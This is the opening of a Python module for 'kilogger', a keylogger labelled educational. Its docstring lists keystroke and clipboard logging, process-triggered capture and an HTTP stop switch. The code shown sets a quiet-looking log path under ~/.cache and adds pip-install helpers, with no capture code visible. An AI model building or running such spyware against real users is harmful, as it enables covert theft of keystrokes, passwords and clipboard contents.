"""
kilogger: A Keylogger Utility for Educational Purposes

Functionalities:
- Capture and log pressed keys.
- Watch processes to trigger keylogger.
- Log clipboard data.
- Stop logger with an HTTP request.

Disclaimer:
kilogger is intended for educational purposes only. It is not designed
for malicious use or unauthorized access. By using this project, you
agree to use it responsibly and ethically.
The developers of this project are not responsible for any misuse of
this tool, and users are responsible for their actions. This project
is provided "as is" without warranties.

Author: Antonino Lorenzo
Version: 1.0.0
"""
import sys
import subprocess
from pathlib import Path

# default log path
U_HOME = Path('~')
LOGLOC = str(U_HOME.expanduser() / '.cache' / 'report.log')
CONFIG = str(Path(Path(__file__).parent / 'config.json'))

# time that is waited to interrupt logging and check running processes
DEFAULT_TIMEOUT = 10


def install_package(package):
    """runs pip install 'package'"""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def verify_package_installation(package):
    """tries to import the package"""
    try:
        __import__(package)
        return True
    except ImportError:
        return False
